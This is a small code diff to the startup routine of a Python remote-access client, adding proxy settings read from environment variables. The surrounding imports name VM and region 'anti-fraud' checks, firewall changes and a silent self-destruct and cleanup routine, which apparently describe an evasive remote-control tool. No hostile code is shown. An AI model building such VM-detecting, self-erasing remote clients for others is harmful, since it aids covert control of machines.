@@ -16,6 +16,7 @@ from remote_client.security.anti_frod_reg import analyze_region
 from remote_client.security.anti_frod_vm import analyze_device
 from remote_client.security.firewall import ensure_firewall_rules
 from remote_client.security.self_destruct import silent_uninstall_and_cleanup
+from remote_client.proxy import load_proxy_settings_from_env, set_proxy_settings
 from remote_client.windows.dpi import ensure_dpi_awareness
 
 
@@ -27,6 +28,9 @@ def _anti_fraud_disabled() -> bool:
 def main() -> None:
     ensure_dpi_awareness()
     base_dir = os.path.dirname(os.path.abspath(__file__))
+    proxy_settings = load_proxy_settings_from_env()
+    if proxy_settings:
+        set_proxy_settings(proxy_settings)
     antifraud_config = load_antifraud_config()
     if _anti_fraud_disabled():
         print("Region anti-fraud disabled for local testing.")
